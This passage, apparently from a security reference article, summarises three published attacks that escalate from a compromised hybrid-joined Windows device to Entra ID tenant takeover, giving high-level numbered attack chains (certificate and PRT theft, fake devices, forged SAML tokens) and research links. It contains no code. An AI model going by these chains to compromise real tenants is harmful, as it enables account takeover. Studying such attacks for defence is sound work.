| **5** | **Impact** | [IMPACT-RANSOM-001] Ransomware Deployment | Attacker deploys ransomware using cloud admin access |

---

## 13. REAL-WORLD EXAMPLES

### Example 1: Datadog Research - "I SPy" Attack (2025)

**Target:** Enterprise tenants with hybrid deployments  
**Timeline:** July 2025  
**Technique Status:** Complete tenant takeover via hybrid device exploitation  
**Impact:** **Full Global Admin compromise from single hybrid device**

**Attack Chain:**
1. Compromise a developer's hybrid-joined laptop via phishing
2. **Escalate to local admin using PrintNightmare**
3. **Extract device certificate and PRT token**
4. **Create ghost device in Entra ID with device trust**
5. **Use ghost device to manipulate federated domains**
6. **Create SAML tokens to impersonate Global Admin**
7. Complete tenant compromise

**Reference:** [Datadog Security Labs - I SPy Attack](https://securitylabs.datadoghq.com/articles/i-spy-escalating-to-entra-id-global-admin/)

---

### Example 2: dr. Nestori Syynimaa's Device Identity Abuse Research (2022)

**Target:** Academic and enterprise security research  
**Timeline:** February 2022  
**Technique Status:** Practical proof-of-concept of device identity theft  
**Impact:** **Demonstrated indefinite persistence via device certificate cloning**

**Attack Chain:**
1. Local admin compromise on hybrid-joined device
2. **Export device certificate and transport key**
3. **Steal device identity using AADInternals**
4. **Create fake device with stolen identity**
5. **Authenticate to cloud services without original device**
6. Persist indefinitely until device cleanup policies engaged

**Reference:** [AADInternals - Stealing Azure AD Device Identities](https://aadinternals.com/post/deviceidentity/)

---

### Example 3: CVE-2022-26923 - ADCS Certificate Abuse Leading to Hybrid Device Compromise

**Target:** Enterprises with ADCS and hybrid device environments  
**Timeline:** 2022 (patched, but variants remain)  
**Technique Status:** Local privilege escalation → device compromise → cloud escalation  
**Impact:** **On-premises admin → Cloud admin via hybrid device**

**Attack Chain:**
1. Exploit CVE-2022-26923 for local privilege escalation
2. **Access device certificate store as admin**
3. **Manipulate device certificate attributes in AD**
4. **Sync changes to Entra ID** via Azure AD Connect
5. **Escalate cloud privileges** using device identity
6. Persistent cloud access

**Reference:** [ADCS Certificate Abuse - Microsoft Security Research](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-defender-atp/detect-credential-theft)

---

## References & External Resources

- [AADInternals Device Identity Blog](https://aadinternals.com/post/deviceidentity/)
- [Datadog Security Labs - I SPy Attack](https://securitylabs.datadoghq.com/articles/i-spy-escalating-to-entra-id-global-admin/)
- [Dirk-jan Mollema's PRT Token Research](https://dirkjanm.io/abusing-azure-ad-sso-with-the-primary-refresh-token/)
- [Microsoft - Hybrid Identity Security Best Practices](https://learn.microsoft.com/en-us/entra/architecture/protect-m365-from-on-premises-attacks)
- [MITRE ATT&CK - Valid Accounts: Cloud Accounts (T1078.004)](https://attack.mitre.org/techniques/T1078/004/)

---
